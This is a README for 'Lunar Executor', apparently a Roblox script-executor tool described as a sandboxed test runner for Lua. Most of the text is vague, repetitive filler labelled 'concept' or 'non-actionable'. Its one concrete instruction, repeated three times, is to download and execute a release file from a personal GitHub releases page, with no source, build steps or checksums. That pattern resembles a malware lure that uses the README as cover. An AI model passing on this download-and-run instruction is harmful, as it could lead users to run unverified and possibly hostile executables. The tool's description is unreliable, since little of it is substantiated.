Overview
- Lunar Executor is a local tool for running user scripts inside a controlled Roblox testing environment.
- The project targets developers, testers, and researchers who need a flexible runner for Lua-based scripts.
- The tool focuses on sandboxing, logging, UI-driven test flows, and developer plugins.
- This README covers design goals, architecture, non-actionable usage, development, contribution, and project roadmap.

Download and run
- Visit the releases page and download the build you need: https://github.com/SMDSAMEER09/Lunar-Executor/releases
- The release file on that page is the file you need to download and execute.
- Use the releases page to pick a stable or pre-release build.

Why this project
- Provide a reproducible local environment for Roblox script testing.
- Offer a sandbox that keeps test runs isolated from live services.
- Give developers a UI to load, run, and inspect scripts.
- Support plugin extensions that let teams add linters, formatters, and mocks.

Key features
- Script runner. Load and run Lua scripts in a contained sandbox.
- UI console. See logs, errors, stack traces, and resource use.
- Plugin system. Add or remove tools without altering core code.
- Mocking layer. Replace services with local mocks for tests.
- Sessions. Save and replay script runs and console output.
- Config profiles. Manage run-time parameters per project.
- Logs and export. Save run logs in JSON, plain text, or HTML.
- Cross-platform builds. Target Windows and macOS builds for teams.

Intended audience
- Roblox developers who need a local test harness for Lua code.
- QA teams who want repeatable test runs and logs.
- Educators who teach Lua scripting and want a safe sandbox.
- Researchers who analyze script behavior without interacting with live servers.

Design goals
- Safety first. The runner isolates scripts from external accounts and services.
- Predictable behavior. Script runs should be deterministic within the same profile.
- Extensibility. Teams should add features via a clear plugin API.
- Observability. Logs and traces must be easy to read and export.
- Simplicity. Keep the UI focused and the workflow short.

High-level architecture
- Core runner: Manages script lifecycle, sandbox, and process isolation.
- Sandbox: A Lua environment with a curated standard library and service stubs.
- UI layer: A lightweight desktop UI with an editor, console, and session manager.
- Plugin host: Loads plugins, exposes hook points, and mediates plugin APIs.
- Mock services: Local replacements for common Roblox services, usable in tests.
- Persistence: Stores profiles, sessions, and logs in a local data folder.

Sandbox model (non-actionable)
- The sandbox exposes a pared-down API surface.
- It restricts access to functions that call external services.
- It limits resource use to prevent runaway scripts in test runs.
- It provides hooks for the plugin host to add mocks and instrumentation.

Plugin system (concept)
- Plugins register against named hook points.
- Hook points include: pre-run, post-run, on-log, on-error, and UI panels.
- Plugins can add UI controls or supply additional mocks.
- The plugin system uses a manifest file per plugin that lists sponsored hook points and permissions.

Installation (high-level)
- Go to the releases page and download the appropriate build.
- Extract or place the build in a test folder.
- Execute the release file provided on the releases page.
- For teams, place profiles and plugin folders in a shared location.

Note: the release file on the releases page is the file you need to download and execute: https://github.com/SMDSAMEER09/Lunar-Executor/releases

Quick start (conceptual)
- Launch the app.
- Create a new project profile.
- Load a script into the editor pane.
- Select or configure a mock service if needed.
- Run the script from the UI and watch the console output.
- Save the session if you need to replay or share the run data.

UI walkthrough
- Top bar: Project title, run controls, and profile selector.
- Left pane: File explorer and script editor.
- Center pane: Active editor and quick tools.
- Right pane: Console with tabs for logs, traces, and exports.
- Bottom bar: Status, resource gauges, and session controls.

Console features
- Color-coded logs for info, warnings, and errors.
- Filter controls to show or hide log levels or namespaces.
- Clickable traces that open the editor to the source line.
- Export buttons to save logs or send them to a plugin.

Script API (overview)
- The runner exposes a minimal API for scripts under test.
- The API supports basic I/O, timers, and stubs for common Roblox services in a test context.
- The API offers hook points that let plugins instrument calls for metrics or tracing.
- The API does not provide access to user accounts or live game servers.

Mock services
- The mock system provides local stand-ins for:
  - Data storage interfaces
  - Player representations for single-session tests
  - Network stubs that simulate server responses
- Mocks let you test logic that depends on service behavior without using live services.
- Mocks come with configuration options and canned responses.

Session recording
- Each run creates a session record.
- The session includes inputs, output logs, and mock configuration.
- You can replay sessions to inspect behavior or reproduce errors.
- Session export formats include a compact JSON that tools can parse.

Profiles and configuration
- Profiles let you store run-time variables per project.
- A profile can specify:
  - Mock selections
  - Resource limits
  - Plugin lists and their enabled state
- Profiles save to a local config folder.

Logging and observability
- The runner records structured logs and plain text logs.
- Logs include timestamps, levels, and optional metadata.
- Plugins can attach metadata to logs for richer context.
- Logs can stream to external tools if a plugin registers an exporter.

Extensibility and plugins
- Plugin manifest fields:
  - name
  - version
  - hook points
  - permissions
- Plugins should avoid access to user credentials or external accounts.
- The plugin system prevents plugin code from altering core security settings.

Development guide (for contributors)
- Clone the repository branch that matches your platform target.
- Use the provided dev scripts to build and run locally.
- Write plugins against the official plugin API in the docs folder.
- Add unit tests that exercise the core runner and sandbox.
- Follow the coding style in the CONTRIBUTING file.

Code layout (concept)
- /src/core        - core runner and sandbox code
- /src/ui          - desktop UI components and layout
- /src/plugins     - built-in plugins and examples
- /docs            - API and plugin documentation
- /tests           - unit and integration tests
- /builds          - build scripts for platform targets

Testing strategy
- Unit tests for sandbox logic and resource limits.
- Integration tests that run scripts in the sandbox and assert logs.
- Plugin tests that load plugins in a controlled host and validate hook behavior.
- End-to-end tests that exercise the UI and session recording.

Security and privacy (non-actionable)
- The runner executes scripts in a local sandbox to avoid contact with live services.
- It stores session and profile data in a local folder only.
- The plugin system restricts plugin permissions to preserve user privacy.
- For teams, store sensitive data outside the project folders.
